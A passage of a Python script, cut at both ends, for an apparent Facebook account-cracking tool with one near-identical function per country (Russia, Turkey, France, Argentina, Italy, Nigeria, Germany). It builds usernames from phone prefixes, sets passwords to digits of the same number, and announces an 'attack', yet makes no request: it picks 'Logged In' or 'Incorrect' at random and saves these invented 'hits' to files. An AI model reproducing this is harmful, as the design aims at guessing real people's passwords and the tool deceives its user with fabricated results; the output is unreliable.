                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(rus)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def TURK():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Turkey',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(turk)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def FR():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('France',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(fr)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def ARG():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Argentina',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(arg)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def ITAL():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Italy',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(ital)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def NIG():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Nigeria',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(nig)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[4:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def GERM():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Germany',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
